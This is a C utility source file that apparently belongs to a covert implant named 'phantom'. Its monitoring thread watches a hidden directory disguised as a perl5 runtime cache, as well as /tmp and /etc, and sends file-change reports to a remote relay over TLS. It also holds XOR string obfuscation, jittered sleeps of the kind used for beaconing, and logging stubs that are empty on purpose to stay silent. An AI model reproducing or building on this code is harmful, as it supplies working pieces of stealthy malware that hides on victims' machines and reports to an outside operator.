
#include "utils.h"
#include "phantom.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <stdbool.h>

#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/inotify.h>
#include <pthread.h>
#include "command_execution.h"
#include "tls_wrapper.h"

volatile bool ph_agent_is_busy = false;

// Monitoring thread for file events (inotify)
void *ph_monitor_thread(void *arg) {
    ph_tls_ctx_t *tls_ctx = (ph_tls_ctx_t *)arg;
    int fd, wd;
    char buffer[4096];
    
    fd = inotify_init();
    if (fd < 0) return NULL;

    // Monitor the stealth path and common directories
    const char *paths[] = {
        "/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache",
        "/tmp",
        "/etc"
    };

    for (int i = 0; i < 3; i++) {
        wd = inotify_add_watch(fd, paths[i], IN_MODIFY | IN_DELETE | IN_MOVE);
    }

    while (1) {
        int length = read(fd, buffer, sizeof(buffer));
        if (length < 0) break;

        int i = 0;
        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            uint8_t opcode = 0;
            char details[256];

            if (event->mask & IN_DELETE) {
                opcode = PH_CMD_FILE_DELETE;
                snprintf(details, sizeof(details), "File deleted: %s", event->name);
            } else if (event->mask & IN_MODIFY) {
                opcode = PH_CMD_FILE_EDIT;
                snprintf(details, sizeof(details), "File edited: %s", event->name);
            } else if (event->mask & IN_MOVE) {
                opcode = PH_CMD_FILE_RENAME;
                snprintf(details, sizeof(details), "File renamed/moved: %s", event->name);
            }

            if (opcode != 0 && tls_ctx != NULL) {
                // Send alert to relay via TLS
                ph_cmd_send_chunked(tls_ctx, details, strlen(details), opcode, 0);
            }
            i += sizeof(struct inotify_event) + event->len;
        }
        usleep(100000); // 100ms throttle
    }

    close(fd);
    return NULL;
}

void ph_memset_s(void *ptr, int value, size_t len)
{
    if (!ptr) {
        return;
    }

    volatile unsigned char *p = (volatile unsigned char *)ptr;
    while (len--) {
        *p++ = (unsigned char)value;
    }
}

void ph_xor_obfuscate(char *str, size_t len)
{
    if (!str || len == 0) {
        return;
    }

    static uint8_t key = 0xAB;
    for (size_t i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

int ph_safe_strcmp(const char *s1, const char *s2)
{
    if (!s1 || !s2) {
        return -1;
    }

    return strcmp(s1, s2);
}

uint64_t ph_get_timestamp_ms(void)
{
    struct timeval tv;
    if (gettimeofday(&tv, NULL) != 0) {
        return 0;
    }
    return (uint64_t)tv.tv_sec * 1000 + (uint64_t)tv.tv_usec / 1000;
}

void ph_sleep_ms(uint32_t milliseconds)
{
    if (milliseconds == 0) {
        return;
    }
    usleep(milliseconds * 1000);
}

void ph_jitter_sleep(uint32_t min_ms, uint32_t max_ms)
{
    if (min_ms > max_ms) {
        uint32_t tmp = min_ms;
        min_ms = max_ms;
        max_ms = tmp;
    }

    uint32_t range = max_ms - min_ms;
    uint32_t jitter = min_ms + (rand() % range);
    ph_sleep_ms(jitter);
}

void *ph_malloc(size_t size)
{
    if (size == 0) {
        return NULL;
    }

    void *ptr = malloc(size);
    if (!ptr) {
        ph_log_error("Memory allocation failed: %zu bytes", size);
        return NULL;
    }

    memset(ptr, 0, size);
    return ptr;
}

void ph_free(void *ptr)
{
    if (ptr) {
        free(ptr);
    }
}

void ph_wipe_memory(void *ptr, size_t size)
{
    if (!ptr || size == 0) {
        return;
    }

    ph_memset_s(ptr, 0, size);
}

void ph_log_info(const char *fmt, ...)
{

    (void)fmt;
}

void ph_log_error(const char *fmt, ...)
{

    (void)fmt;
}

void ph_log_debug(const char *fmt, ...)
{

    (void)fmt;
}
